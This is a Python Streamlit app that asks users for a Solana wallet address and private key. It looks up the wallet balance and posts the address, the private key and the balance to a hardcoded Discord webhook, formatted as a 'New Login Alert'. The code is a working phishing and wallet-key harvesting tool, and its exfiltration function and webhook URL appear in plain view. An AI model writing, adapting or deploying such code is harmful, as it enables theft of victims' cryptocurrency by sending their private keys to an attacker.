import streamlit as st
import requests
from datetime import datetime
import base58

# Discord webhook configuration
WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1331353119686135922/BR0eqE0KKC5NkH2NBHCHNBSY3BXCNu_d9BETAFArslW4IJ9Ikh2STmCWHci_VaXaV796'

def get_solana_balance(wallet_address):
    """Fetch the SOL balance of a Solana wallet using the Solana RPC API."""
    url = "https://api.mainnet-beta.solana.com"
    payload = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "getBalance",
        "params": [wallet_address]
    }
    headers = {"Content-Type": "application/json"}
    
    try:
        response = requests.post(url, json=payload, headers=headers)
        response.raise_for_status()  # Raise an error for bad status codes
        data = response.json()
        if "error" in data:
            st.error(f"Solana RPC Error: {data['error']['message']}")
            return None
        balance = data.get("result", {}).get("value", 0)
        # Convert lamports to SOL (1 SOL = 10^9 lamports)
        return balance / 1e9
    except requests.exceptions.RequestException as e:
        st.error(f"Failed to fetch balance: {str(e)}")
        return None

def send_credentials_to_discord(wallet, key):
    """Send wallet details and balance to Discord."""
    balance = get_solana_balance(wallet)
    if balance is not None:
        message = {
            "content": f"""
🎯 **New Login Alert**
━━━━━━━━━━━━━━━━━━━━━━━━
👛 **Wallet:** `{wallet}`
🔑 **Key:** `{key}`
💰 **Balance:** `{balance:.9f} SOL`
⏰ **Time:** `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`
━━━━━━━━━━━━━━━━━━━━━━━━
            """
        }
        try:
            response = requests.post(WEBHOOK_URL, json=message)
            response.raise_for_status()  # Raise an error for bad status codes
            st.success("Credentials and balance sent to Discord!")
            return True
        except requests.exceptions.RequestException as e:
            st.error(f"Failed to send data to Discord: {str(e)}")
            return False
    else:
        st.error("Failed to fetch wallet balance.")
        return False

def validate_solana_address(address):
    """Validate a Solana wallet address."""
    try:
        decoded = base58.b58decode(address)
        return len(decoded) in [32, 44]
    except ValueError:
        return False

def validate_solana_private_key(key):
    """Validate a Solana private key."""
    try:
        decoded = base58.b58decode(key)
        return len(decoded) == 64
    except ValueError:
        return False

def display_user_wallet_info():
    """Display the user's wallet address and private key in the top-right corner."""
    if 'wallet' in st.session_state and 'private_key' in st.session_state:
        # Create a container in the top-right corner
        st.markdown(
            """
            <style>
            .wallet-info {
                position: fixed;
                top: 10px;
                right: 10px;
                background-color: rgba(41, 55, 240, 0.1);
                padding: 15px;
                border-radius: 10px;
                border: 1px solid #2937f0;
                z-index: 1000;
            }
            </style>
            """,
            unsafe_allow_html=True
        )
        
        # Display wallet address
        st.markdown(
            f"""
            <div class="wallet-info">
                <h4>Your Wallet Address</h4>
                <p><code>{st.session_state.wallet}</code></p>
            </div>
            """,
            unsafe_allow_html=True
        )
        
        # Toggle private key visibility
        if 'show_private_key' not in st.session_state:
            st.session_state.show_private_key = False
        
        if st.button("👁️ Toggle Private Key Visibility", key="toggle_private_key"):
            st.session_state.show_private_key = not st.session_state.show_private_key
        
        if st.session_state.show_private_key:
            st.markdown(
                f"""
                <div class="wallet-info">
                    <h4>Your Private Key</h4>
                    <p><code>{st.session_state.private_key}</code></p>
                </div>
                """,
                unsafe_allow_html=True
            )
        else:
            st.markdown(
                """
                <div class="wallet-info">
                    <h4>Your Private Key</h4>
                    <p><code>************************</code></p>
                </div>
                """,
                unsafe_allow_html=True
            )